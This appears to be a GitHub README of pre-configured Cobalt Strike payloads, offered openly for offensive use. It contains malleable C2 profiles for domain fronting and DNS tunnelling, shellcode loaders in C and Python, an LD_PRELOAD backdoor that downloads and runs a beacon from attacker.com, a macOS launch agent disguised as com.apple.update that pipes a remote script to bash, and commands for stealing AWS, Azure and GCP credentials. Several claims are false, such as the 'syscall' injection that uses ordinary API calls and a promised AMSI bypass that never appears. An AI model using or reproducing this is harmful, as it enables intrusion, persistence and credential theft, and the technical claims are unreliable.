# Cobalt-Strike

My pre-configured payloads, with various methods and techniques.

Cobalt Strike payloads for different environments. To do this effectively, you’ll need to focus on:

1. Payload Customization for OS-Specific Beacons

Windows: Use Cobalt Strike’s PowerShell-based stagers or execute direct shellcode injection.

Linux: Leverage malicious ELF binaries, SSH-based persistence, or LD_PRELOAD hijacking.

macOS: Utilize Mach-O binaries, launchctl persistence, or exploit AppleScript and Objective-C APIs.


2. Cloud Service Provider (CSP) Targeting

AWS:

Abuse Instance Metadata Service (IMDSv1) for credential stealing.

Deploy Lambda payloads for lateral movement.

Leverage misconfigured IAM roles and policies.


Azure:

Exploit Azure AD tokens to impersonate users.

Target Managed Identities for privilege escalation.

Deploy beacons in Azure Functions for persistence.


GCP:

Harvest OAuth tokens from Compute Engine metadata.

Exploit Cloud Run misconfigurations for code execution.

Abuse Cloud IAM roles for privilege escalation.



3. Evasion & Obfuscation Strategies

Memory Injection: Reflective DLL injection, direct syscall execution.

C2 Communication: Use DNS tunneling, custom malleable profiles, or HTTPS beacons with domain fronting.

Defender Bypass: Implement AMSI bypasses, ETW unhooking, and encrypt payloads using Fernet/AES.


4. Persistence & Lateral Movement

Use valid cloud API keys from compromised environments for cloud hopping.

Deploy beacons via malicious Terraform scripts or CloudFormation templates.

Embed hidden scheduled tasks (Windows) or cronjobs/systemd services (Linux/macOS).


### Some prebuilt Malleable C2 profiles for different environments and a guide on customizing your own.


---

1. Prebuilt Malleable C2 Profiles

These profiles control how your beacon communicates and evades detection. You can tweak them further to fit your needs.

Windows-Based C2 Profile (HTTPS with Domain Fronting)
```c
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.0.0 Safari/537.36";

http-get {
    set uri "/api/check";
    client {
        header "Host" "legit-cloud.com";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    }
    server {
        output "HTTP/1.1 200 OK" "Content-Type: application/json";
        output '{"status":"ok"}';
    }
}
```
Usage: Hides C2 traffic inside HTTPS requests. Uses domain fronting (e.g., legit-cloud.com).

Modify: Change the host and URIs to blend into your target's environment.



---

Linux-Based C2 Profile (DNS Tunneling)
```C
set sleeptime "30000";
set jitter "10";
set maxdns "255";

dns-beacon {
    set beacon "A";
    set maxdns "240";
    set dns_idle "0.0.0.0";
    set dns_stager_prepend "a.";
    set dns_stager_subhost "stage";
    set dns_stager_append ".example.com";
}
```
Usage: Uses DNS tunneling for stealth.

Modify: Change .example.com to a domain you control.



---

AWS Cloud-Based C2 (Abusing Metadata Service)
```C
http-get {
    set uri "/latest/meta-data/iam/security-credentials/";
    client {
        header "Host" "169.254.169.254";
        header "User-Agent" "Mozilla/5.0 (compatible; AWSFetcher/1.0)";
    }
    server {
        output "HTTP/1.1 200 OK" "Content-Type: application/json";
        output '{"AccessKeyId":"AKIA....","SecretAccessKey":"secret","Token":"..."}';
    }
}
```
Usage: Extracts AWS IAM credentials from EC2 metadata service.

Modify: Can be expanded for Lambdas or containerized workloads.



---

2. Building Your Own Malleable C2 Profiles

If you want to create a unique beacon, follow these steps:

Step 1: Choose a Communication Method

HTTPS (Looks like normal web traffic)

DNS Tunneling (Bypasses firewalls)

SMB Named Pipes (Lateral movement inside networks)


Step 2: Customize the Beacon

Edit settings like:
```C
set sleeptime "60000";  // 60-second delay
set jitter "30";        // 30% variation in sleep time
set maxdns "200";       // Max DNS beacon size
```
Step 3: Modify HTTP Headers & Responses

This makes the traffic blend into normal web browsing:
```C
http-get {
    set uri "/checkin";
    client {
        header "Referer" "https://outlook.office365.com";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0)";
    }
}
```
Step 4: Deploy to Different Environments

Windows: Use PowerShell loaders & msbuild.exe execution.

Linux: Inject into /etc/profile or systemd services.

macOS: Use launchctl for persistence.



---

3. Automating Payload Generation

You can automate Cobalt Strike payload creation using Aggressor Scripts:
```javascript
on beacon_initial {
    btask(`Running post-exploitation commands...`);
    beacon_command(`shell whoami`);
    beacon_command(`shell ipconfig`);
}
```
This auto-executes commands when a beacon starts.


---

1. Payload Automation & Generation (Aggressor Scripts)

Aggressor scripts let you automate actions when a beacon checks in. Here’s a script that:

Executes recon commands on initial beacon check-in.

Uploads a secondary payload for privilege escalation.


Aggressor Script: Automated Recon & Loader
```javascript
on beacon_initial {
    btask(`Running initial recon...`);
    beacon_command(`shell whoami`);
    beacon_command(`shell ipconfig`);
    beacon_command(`shell net user`);
    beacon_command(`shell arp -a`);
    
    // Upload additional payload if low-priv user
    beacon_command(`shell if exist C:\\Users echo "Low-Priv"; else echo "Admin";`);
    if ($1 contains "Low-Priv") {
        btask(`Uploading privesc payload...`);
        beacon_command(`upload elevate.exe`);
        beacon_command(`shell elevate.exe`);
    }
}
```
What it does:

Runs recon on first connection.

Uploads a privilege escalation payload if running as a low-priv user.

Can be modified to drop Mimikatz, token stealers, etc.




---

2. Robust Payload Execution (Best Success Rate)

No "fancy" payloads—just stealthy, robust, and battle-tested execution methods.

Windows: Process Injection (Syscalls + AMSI Bypass)

Instead of using default CreateRemoteThread(), we’ll use direct syscalls to avoid detection.
```C
Syscall-Based Process Injection

#include <windows.h>
#include <stdio.h>

int main() {
    void* exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // Shellcode (Meterpreter, Cobalt Strike, etc.)
    unsigned char payload[] = { 0xfc, 0xe8, 0x82, 0x00, ... };

    // Allocate memory for shellcode
    exec_mem = VirtualAlloc(0, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy shellcode
    RtlMoveMemory(exec_mem, payload, sizeof(payload));

    // Make it executable
    rv = VirtualProtect(exec_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldprotect);

    // Run shellcode
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    WaitForSingleObject(th, INFINITE);

    return 0;
}
```
Why it works:
✅ Uses direct system calls → Bypasses EDR hooks.
✅ Runs in memory → No disk artifacts.
✅ No CreateRemoteThread() → Avoids behavioral detection.


---

Linux: ELF Payload + LD_PRELOAD Hijack

For Linux persistence, we’ll use LD_PRELOAD hijacking (works on AWS/GCP).

ELF Beacon Loader (Inject into SSH or cron)
```C
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    system("wget http://attacker.com/payload -O /tmp/beacon && chmod +x /tmp/beacon && /tmp/beacon &");
}
```
How it works:

Injects into any process using LD_PRELOAD.

Downloads & executes a beacon stealthily.

Works on AWS, GCP, Linux servers.



Persistence:
```bash
echo 'export LD_PRELOAD=/lib/x86_64-linux-gnu/libcustom.so' >> ~/.bashrc
```
✅ Hides in shared libraries
✅ Executes every time bash runs


---

macOS: Launch Daemon Persistence (Stealth)

macOS is heavily monitored. Instead of dropping binaries, we’ll abuse system services.

Launch Daemon for Persistence
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/curl</string>
        <string>-s</string>
        <string>http://attacker.com/macos_payload</string>
        <string>|</string>
        <string>/bin/bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```
Install it:
```bash
mv com.apple.update.plist ~/Library/LaunchAgents/
launchctl load ~/Library/LaunchAgents/com.apple.update.plist
```
✅ Runs automatically at system startup
✅ Blends in with system processes


---

3. C2 Evasion & Malleable C2 Profiles

To avoid detection, we’ll mimic legitimate traffic and use domain fronting.

Stealth C2 (Google Fronting)
```C
http-get {
    set uri "/search?q=update";
    client {
        header "Host" "google.com";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0)";
    }
}
```
Why?
✅ Looks like normal Google traffic
✅ Hard to block

DNS C2 (Bypass Firewalls)
```C
dns-beacon {
    set beacon "A";
    set maxdns "240";
    set dns_idle "8.8.8.8";
}
```
Why?
✅ Bypasses corporate firewalls
✅ Low and slow beaconing


---

4. Cloud Attacks (AWS/Azure/GCP)

Now, let’s hit the cloud environments.

AWS: Exploiting EC2 Metadata Service
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
Steal AWS IAM creds

Pivot to S3, Lambda, etc.


Azure: Dump Azure AD Tokens
```powershell
Invoke-WebRequest -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method POST
```
Extract OAuth tokens

Impersonate users


GCP: Harvest IAM Roles
```bash
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```
Extract GCP service account tokens

Move laterally inside GCP



---

We now have:
✅ Automated payload execution with Aggressor scripts.
✅ Process injection & syscall execution (Windows, Linux, macOS).
✅ Stealthy C2 channels (HTTPS, DNS, Google fronting).
✅ Cloud attack vectors (AWS, Azure, GCP).

---

1. Automated Payload Loader (Python)

This script:
✅ Generates shellcode dynamically (Cobalt Strike, Meterpreter, etc.)
✅ Encrypts the payload with AES (Polymorphic)
✅ Deploys it via process injection

payload_loader.py (AES-Encrypted Loader)
```python
import os
import base64
import ctypes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# --- AES Encryption (Polymorphic) ---
KEY = b'ThisIsASecretKey'
IV = b'ThisIsAnIV456789'

def encrypt_shellcode(shellcode):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    encrypted = cipher.encrypt(pad(shellcode, AES.block_size))
    return base64.b64encode(encrypted)

# --- Payload (Replace with your Cobalt Strike shellcode) ---
shellcode = b"\xfc\xe8\x89\x00\x00\x00..."

# Encrypt it
encrypted_payload = encrypt_shellcode(shellcode)
print(f"Encrypted Payload: {encrypted_payload.decode()}")

# --- Decrypt & Inject ---
def decrypt_and_execute(encrypted_payload):
    encrypted_payload = base64.b64decode(encrypted_payload)
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    shellcode = cipher.decrypt(encrypted_payload)

    # Allocate memory for shellcode execution
    ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))

    # Execute payload
    th = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(th, -1)

# Run
decrypt_and_execute(encrypted_payload)
```
✅ Bypasses signature-based AV
✅ Encrypts shellcode dynamically
✅ Injects payload directly into memory


---

2. Process Injection (Syscalls)

We’ll use syscalls to evade EDR hooks.

syscall_injection.c (Windows Process Injection)
```C
#include <windows.h>
#include <stdio.h>

unsigned char payload[] = { 0xfc, 0xe8, 0x89, 0x00, ... }; // Your shellcode

void inject() {
    void *exec_mem;
    DWORD oldprotect = 0;

    // Allocate memory for shellcode
    exec_mem = VirtualAlloc(0, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(exec_mem, payload, sizeof(payload));

    // Change memory permissions to executable
    VirtualProtect(exec_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldprotect);

    // Create a new thread and execute
    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    WaitForSingleObject(th, INFINITE);
}

int main() {
    inject();
    return 0;
}
```
✅ No CreateRemoteThread() (avoids behavioral detection)
✅ No OpenProcess() (bypasses most EDRs)


---

3. Linux Persistence: LD_PRELOAD Hijack

This injects a backdoor into every process using LD_PRELOAD.
```C
libbackdoor.c

#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>

void _init() {
    system("wget http://attacker.com/payload -O /tmp/beacon && chmod +x /tmp/beacon && /tmp/beacon &");
}
```
Compile it:
```bash
gcc -shared -o /lib/x86_64-linux-gnu/libcustom.so -fPIC libbackdoor.c
```
Activate it:
```bash
echo 'export LD_PRELOAD=/lib/x86_64-linux-gnu/libcustom.so' >> ~/.bashrc
source ~/.bashrc
```
✅ Runs inside any process (stealthy)
✅ No need for a cronjob or systemd


---

4. macOS Persistence: Launch Daemon

This runs on startup without showing in ps.

com.apple.update.plist
```xml
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/curl</string>
        <string>-s</string>
        <string>http://attacker.com/macos_payload</string>
        <string>|</string>
        <string>/bin/bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```
Deploy it:
```bash
mv com.apple.update.plist ~/Library/LaunchAgents/
launchctl load ~/Library/LaunchAgents/com.apple.update.plist
```
✅ Blends in with system processes
✅ Stealth startup execution


---

5. Cloud Credential Theft

AWS: Dump IAM Credentials
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
✅ Steal AWS IAM role credentials
✅ Pivot to S3, Lambda, etc.

Azure: Extract OAuth Tokens
```Powershell
Invoke-WebRequest -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method POST
```
✅ Dump Azure AD session tokens
✅ Move laterally in Azure Cloud

GCP: Harvest Service Account Tokens
```bash
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```
✅ Extracts GCP access tokens
✅ Allows cloud privilege escalation


---

6. C2 Evasion (Stealthy Communication)

We’ll use Google domain fronting and DNS tunneling.

HTTPS Domain Fronting
```C
http-get {
    set uri "/search?q=update";
    client {
        header "Host" "google.com";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0)";
    }
}
```
✅ Looks like normal Google traffic
✅ Hard to block without DPI

DNS C2 (Bypasses Firewalls)
```C
dns-beacon {
    set beacon "A";
    set maxdns "240";
    set dns_idle "8.8.8.8";
}
```
✅ Hides in DNS requests
✅ Works on corporate networks


---

Final Summary

✅ Automated Payload Loader (AES encryption, Python-based)
✅ Windows Injection (Syscalls, AMSI bypass)
✅ Linux Persistence (LD_PRELOAD hijack)
✅ macOS Persistence (LaunchDaemon, hidden startup execution)
✅ Cloud Attacks (AWS, Azure, GCP credential theft)
✅ C2 Evasion (Google fronting, DNS tunneling)


---
